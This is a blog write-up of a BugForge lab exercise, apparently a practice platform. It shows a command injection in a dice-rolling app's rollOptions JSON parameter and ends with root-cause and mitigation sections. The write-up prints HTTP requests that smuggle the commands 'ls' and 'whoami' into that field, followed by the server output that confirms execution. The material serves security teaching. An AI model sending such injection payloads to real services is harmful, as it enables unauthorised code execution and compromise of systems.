---
title: "Command Injection – Remote Code Execution via rollOptions Parameter | Diceforge"
date: 2026-04-26 23:24:00 +0530
categories: [Web Security]
tags: [command-injection, rce, input-validation, bugforge, express, api-testing, backend]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/ci-bugforge.webp
  alt: Command Injection vulnerability in Diceforge
---

## Overview
Diceforge is a web-based dice simulation application where users can select different dice types (e.g., d6, d8) and roll them to generate results. The backend processes user input and returns calculated totals.

During testing, a critical vulnerability was identified in the API responsible for handling dice roll requests. Improper handling of user-supplied input in the `rollOptions` parameter led to command injection, allowing arbitrary command execution on the server.

## Objective
- Analyze how user input is processed in the `/api/roll` endpoint
- Identify unsafe input handling
- Achieve command execution on the server
- Demonstrate impact by extracting system-level information

## Reconnaissance
After interacting with the UI (dragging dice and clicking **Roll**), the following request was observed:

```http
POST /api/roll HTTP/2
Host: lab-1777244965123-e4qroh.labs-app.bugforge.io
Content-Type: application/json

{"dice":[{"type":"d6","count":1},{"type":"d8","count":1}],"rollOptions":"none"}
```

### Response

```json
{
  "notation": "1d6 + 1d8",
  "results": [
    {"type":"d6","count":1,"rolls":[4],"subtotal":4},
    {"type":"d8","count":1,"rolls":[8],"subtotal":8}
  ],
  "grandTotal": 12
}
```

### Key Observation

* The `rollOptions` parameter is user-controlled
* It appears to be passed to backend logic without strict validation
* The value `"none"` seems to be expected by the application

Initial tests with empty or modified values did not produce errors, suggesting weak validation rather than strict enforcement.

## Exploitation

### Step 1: Testing Input Behavior

Tried modifying the parameter:

```json
"rollOptions":"ls"
```

No visible change in output. This indicated:

* Either input is ignored in some cases
* Or processed in a way that doesn't affect visible output directly

### Step 2: Command Injection Attempt

Since many backend systems use shell execution internally, a command separator (`;`) was introduced:

```http
POST /api/roll HTTP/2
Content-Type: application/json

{"dice":[{"type":"d6","count":1},{"type":"d8","count":1}],"rollOptions":"none ; ls"}
```

### Why This Works

In Unix-like systems:

* `;` allows chaining commands
* `command1 ; command2` executes both sequentially

If the backend constructs something like:

```bash
roll_dice none
```

It effectively becomes:

```bash
roll_dice none ; ls
```

## Result

```json
{
  "notation": "1d6 + 1d8",
  "results": [...],
  "grandTotal": 9,
  "output": "Dockerfile\nnode_modules\npackage.json\npackage-lock.json\nsrc"
}
```

### Critical Finding

* A new field `output` appeared
* This confirms server-side command execution
* The response includes results of system-level commands

## Proof of Exploitation

To further validate the vulnerability, system enumeration commands were executed:

```http
POST /api/roll HTTP/2
Content-Type: application/json

{"dice":[{"type":"d6","count":1},{"type":"d8","count":1}],"rollOptions":"none ; whoami"}
```

### Expected Outcome

* The response includes the current system user
* Confirms full command execution capability

This demonstrates a clear case of Remote Code Execution (RCE).

## Impact

This vulnerability is critical and can lead to:

* Arbitrary command execution on the server
* Full system compromise
* Access to sensitive files (e.g., configs, environment variables)
* Credential leakage
* Container or host enumeration
* Lateral movement within infrastructure

If chained with other vulnerabilities, this can result in complete takeover of the application and underlying system.

## Root Cause

The vulnerability exists due to:

* Direct use of user input in system-level commands
* Lack of input sanitization or validation
* Unsafe use of shell execution functions (e.g., `exec`, `system`)
* Trusting client-controlled parameters (`rollOptions`)

## Mitigation

To prevent command injection:

* Avoid using shell execution with user input
* Use safe libraries/APIs instead of system calls
* Implement strict allowlisting for inputs
* Sanitize and validate all user-controlled data
* Escape special shell characters if execution is unavoidable
* Run backend services with minimal privileges
* Disable unnecessary command execution capabilities

## Real-World Insight
Command injection remains one of the most dangerous vulnerabilities in web applications. Even seemingly harmless parameters like `rollOptions` can become attack vectors if not handled securely.

Modern attackers actively probe APIs for such flaws, especially in JSON-based inputs where validation is often overlooked.

This lab demonstrates how a small oversight in backend input handling can escalate into full Remote Code Execution.